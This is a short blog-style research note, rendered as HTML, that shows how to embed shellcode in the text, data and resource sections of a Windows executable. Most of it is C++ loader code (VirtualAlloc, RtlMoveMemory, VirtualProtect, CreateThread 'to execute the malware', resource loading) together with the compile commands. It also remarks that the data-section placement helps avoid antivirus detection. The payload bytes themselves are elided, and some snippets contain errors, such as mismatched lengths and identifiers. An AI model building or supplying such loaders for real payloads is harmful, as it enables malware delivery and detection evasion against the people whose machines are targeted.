<!doctype html><html lang=en-us><head><title>Embedding Shellcode in Text, Data and Resource Sections // Research Notes</title>
<link rel="shortcut icon" href=favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.127.0"><meta name=format-detection content="telephone=no"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Martin Stoynov"><meta name=description content><link rel=stylesheet href=/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css><link rel=stylesheet href=/custom.css><meta name=twitter:card content="summary"><meta name=twitter:title content="Embedding Shellcode in Text, Data and Resource Sections"><meta name=twitter:description content="Text Section Write the shellcode and it’s length into variables.
#include <windows.h> #include <stdio.h> #include <string.h> int main (VOID) { unsigned char shellcode_payload[196] = [ /* ... */ ]; unsigned int shellcode_length = 279; // ... } Allocate the memory space.
LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE // [in, optional] LPVOID lpAddress, // [in] SIZE_T dwSize // [in] DWORD flAllocationType // [in] DWORD flProtect ); Load the shellcode into the allocated memory."><meta property="og:url" content="/notes/embedding-shellcode-in-text-data-and-resource-sections/"><meta property="og:site_name" content="Research Notes"><meta property="og:title" content="Embedding Shellcode in Text, Data and Resource Sections"><meta property="og:description" content="Text Section Write the shellcode and it’s length into variables.
#include <windows.h> #include <stdio.h> #include <string.h> int main (VOID) { unsigned char shellcode_payload[196] = [ /* ... */ ]; unsigned int shellcode_length = 279; // ... } Allocate the memory space.
LPVOID memory_address = VirtualAlloc(NULL, shellcode_length, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE // [in, optional] LPVOID lpAddress, // [in] SIZE_T dwSize // [in] DWORD flAllocationType // [in] DWORD flProtect ); Load the shellcode into the allocated memory."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="notes"><meta property="article:published_time" content="2026-02-22T00:00:00+00:00"><meta property="article:modified_time" content="2026-02-22T00:00:00+00:00"><meta property="article:tag" content="C++"><meta property="article:tag" content="WinAPI"><link rel=alternate type=application/rss+xml href=/index.xml title="Research Notes"></head><body><header class=app-header><a href=/><img class=app-header-avatar src=/avatar.jpg alt="Martin Stoynov"></a><h1>Research Notes</h1><nav class=app-header-menu><a class=app-header-menu-item href=/notes/>Notes</a>
-
<a class=app-header-menu-item href=/tags/>Tags</a></nav><p>A Zettelkasten-style digital garden of evolving research notes.</p><div class=app-header-social><a href=https://github.com/martinstnv target=_blank rel="noreferrer noopener"><svg class="icon icon-github" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>github</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
</a><a href=https://linkedin.com/in/martinstnv target=_blank rel="noreferrer noopener"><svg class="icon icon-linkedin" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>linkedin</title><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
</a><a href=https://infosec.exchange/@martinstnv target=_blank rel="noreferrer noopener"><svg class="icon icon-brand-mastodon" viewBox="0 0 24 24" fill="currentcolor"><title>Mastodon</title><path d="M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792.0 11.813.0h-.03c-3.98.0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057.0 00.023-.043v-1.809a.052.052.0 00-.02-.041.053.053.0 00-.046-.01 20.282 20.282.0 01-4.709.545c-2.73.0-3.463-1.284-3.674-1.818a5.593 5.593.0 01-.319-1.433.053.053.0 01.066-.054c1.517.363 3.072.546 4.632.546.376.0.75.0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23.0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112.0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311.0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13.0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>Embedding Shellcode in Text, Data and Resource Sections</h1><div class=post-meta><div><svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
Feb 22, 2026</div><div><svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
3 min read</div><div><svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg>
<a class=tag href=/tags/c++/>C++</a>
<a class=tag href=/tags/winapi/>WinAPI</a></div></div></header><div class=post-content><h2 id=text-section>Text Section</h2><p>Write the shellcode and it’s length into variables.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span> (VOID) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> shellcode_payload[<span style=color:#ae81ff>196</span>] <span style=color:#f92672>=</span> [ <span style=color:#75715e>/* ... */</span> ];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>  shellcode_length       <span style=color:#f92672>=</span> <span style=color:#ae81ff>279</span>;
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Allocate the memory space.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>LPVOID memory_address <span style=color:#f92672>=</span> VirtualAlloc(NULL, shellcode_length, MEM_RESERVE <span style=color:#f92672>|</span> MEM_COMMIT, PAGE_READWRITE
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in, optional]    LPVOID    lpAddress,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]              SIZE_T    dwSize
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]              DWORD     flAllocationType
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]              DWORD     flProtect
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Load the shellcode into the allocated memory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>RtlMoveMemory(memory_address, shellcode_payload, shellcode_length
</span></span><span style=display:flex><span>  <span style=color:#75715e>// _Out_            VOID UNALIGNED    *Destination,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// _In_    const    VOID UNALIGNED    *Source,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// _In_             SIZE_T             Length
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Make the shellcode executable by changing the protections on the virtual block of memory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>DWORD old_protection <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>BOOL returned_vp <span style=color:#f92672>=</span> VirtualProtect(memory_address, shellcode_length, PAGE_EXECUTE_READ, <span style=color:#f92672>&amp;</span> old_protection
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in]   LPVOID   lpAddress,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]   SIZE_T   dwSize,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]   DWORD    flNewProtect,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [out]  PDWORD   lpflOldProtect
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Create a thread to execute the malware.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>if</span> (returned_vp <span style=color:#f92672>!=</span> NULL) {
</span></span><span style=display:flex><span>    HANDLE thread_handle <span style=color:#f92672>=</span> CreateThread(NULL, <span style=color:#ae81ff>0</span>, (LDTHREAD_START_ROUTINE) memory_address, NULL, NULL, NULL
</span></span><span style=display:flex><span>      <span style=color:#75715e>// [in, optional]   LPSECURITY_ATTRIBUTES     lpThreadAttributes,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// [in]             SIZE_T                    dwStackSize,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// [in]             LPTHREAD_START_ROUTINE    lpStartAddress,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// [in, optional]   drv_aliasesMem LPVOID     lpParameter,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// [in]             DWORD                     dvCreationFlags,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// [out, optional]  LPDWORD                   lpThreadId
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Wait for the thread to complete.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>WaitForSingleObject(thread_handle, INFINITE
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in] HANDLE hHandle,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in] DWORD dwMilliseconds
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Compile and run the code.</p><pre tabindex=0><code>cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\executable\file.exe C:\path\to\get\source\file.cpp
</code></pre><h2 id=data-section>Data Section</h2><p>To embed shellcode into the data section (<code>.data</code>), you need to move the shellcode outside of the main function.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> shellcode_payload[<span style=color:#ae81ff>196</span>] <span style=color:#f92672>=</span> [ <span style=color:#75715e>/* ... */</span> ];
</span></span><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>  shellcode_length       <span style=color:#f92672>=</span> <span style=color:#ae81ff>279</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span> (VOID) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><blockquote><p>Embedding shellcode in the data section can help avoid AV detection.</p></blockquote><p>Compile and run the code.</p><pre tabindex=0><code>cl.exe /Zi /EHsc /nologo /FeC:\path\to\save\executable\file.exe C:\path\to\get\source\file.cpp
</code></pre><h2 id=resource-section>Resource Section</h2><p>To embed shellcode in the resource section, rename <code>shellcode.bat</code> to <code>shellcode.ico</code>.</p><p>Create an rsrc.rc file with the following contents.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#define SC_ICON 1337
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>SC_ICON RCDATA <span style=color:#e6db74>&#34;shellcode.ico&#34;</span>
</span></span></code></pre></div><p>The file defines an <code>SC_ICON</code> which holds a reference to the <code>shellcode.ico</code> file.</p><p>Next, define the <code>SC_ICON</code> in the code of the executable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;windows.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#define SC_ICON 2583
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span> (VOID) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// ...
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>Find the resource.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>HRSRC shellcode <span style=color:#f92672>=</span> FindResourceW(NULL, MAKEINTRESOURCEW(SC_ICON), RT_RCDATA
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in, optional]  HMODULE  hModule,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]            LPCSTR   lpName,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]            LPCSTR   lpType
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Load the resource into memory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>HGLOBAL shellcode_handle <span style=color:#f92672>=</span> LoadResource(NULL, shellcode
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in, optional]  HMODULE   hModule,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]            HRSRC     hResInfo
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Get pointer to the resource.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>LPVOID shellcode_payload <span style=color:#f92672>=</span> LockResource(shellcode_handle
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in] HGLOBAL hResData
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Get the size of the resource.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>DWORD shellcode_length <span style=color:#f92672>=</span> SizeofResource(NULL, shellcode
</span></span><span style=display:flex><span>  <span style=color:#75715e>// [in, optional]   HMODULE  hModule,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// [in]             HRSRC    hResInfo
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>);
</span></span></code></pre></div><p>Use the <code>rc</code> utility to initiate the resource file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>rc rsrc.rc
</span></span></code></pre></div><p>Create an object file for the resource.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>cvtres <span style=color:#f92672>/</span>MACHINE:X86 <span style=color:#f92672>/</span>OUT:rsrc.o rsrc.res
</span></span></code></pre></div><p>Compile the executable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>cl.exe <span style=color:#f92672>/</span>nologo <span style=color:#f92672>/</span><span style=color:#ae81ff>0</span>x <span style=color:#f92672>/</span>w0 <span style=color:#f92672>/</span>GS<span style=color:#f92672>-</span> <span style=color:#f92672>/</span>DNDEBUG <span style=color:#f92672>/</span>Tcexample.cpp <span style=color:#f92672>/</span>Link <span style=color:#f92672>/</span>OUT:example.exe <span style=color:#f92672>/</span>SUBSYSTEM:CONSOLE <span style=color:#f92672>/</span> MACHINE:X86 rsrc.o
</span></span></code></pre></div></div><div class=post-footer></div></article></main></body></html>